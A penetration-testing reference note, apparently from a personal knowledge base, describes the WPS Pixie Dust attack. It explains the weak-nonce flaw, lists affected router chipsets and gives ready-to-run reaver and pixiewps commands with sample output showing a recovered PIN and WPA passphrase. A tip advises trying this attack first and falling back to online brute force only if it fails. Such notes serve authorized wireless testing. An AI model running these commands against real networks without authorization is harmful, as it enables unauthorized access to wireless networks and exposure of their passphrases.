---
tags: [pentest, wireless, wps, pixie-dust, offline, both, initial-access]
tool: reaver
phase: 5
---
# Pixie Dust Attack

Offline WPS attack that exploits weak random number generation in certain router chipsets. Recovers the WPS PIN in seconds without brute-forcing.

[[10 - Wireless/00 - README|Folder index]]

## How it works

During WPS exchange, the AP generates two random nonces (E-S1, E-S2). Some chipsets use weak or predictable RNGs (timestamps, zeros, sequential values). If the nonces are predictable, the PIN can be computed offline from a single WPS exchange.

## Vulnerable chipsets

Ralink RT2860/RT3062, Realtek RTL8188/RTL8192, MediaTek MT7620, Broadcom (some), and various budget router SoCs.

## Attack with Reaver

```bash
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -K -vv
```

`-K` activates the Pixie Dust module. If the AP is vulnerable, the PIN appears in seconds.

## Attack with pixiewps standalone

```bash
# 1. Start a single WPS exchange with Reaver to collect crypto values
sudo reaver -i wlan0mon -b <BSSID> -c <CH> -vv -K

# 2. If Reaver doesn't auto-solve, grab PKE, PKR, AuthKey, E-Hash1, E-Hash2, E-Nonce from output
# 3. Feed to pixiewps manually
pixiewps -e <PKE> -r <PKR> -s <E-Hash1> -z <E-Hash2> -a <AuthKey> -n <E-Nonce>
```

## Success indicators

```text
[+] WPS pin:  12345670
[+] WPA PSK:  NetworkPassword123
```

If output says `WPS pin not found` — the AP uses a strong RNG and is not vulnerable to Pixie Dust. Fall back to online brute force.

> [!tip] Always try Pixie Dust first
> It's fast (seconds), offline (no lockout risk), and works on a surprisingly large number of consumer routers. Only fall back to online brute force if Pixie Dust fails.

## See also

- [[09 - Reaver WPS]]
- [[10 - Bully WPS]]
- [[14 - wash WPS Discovery]]
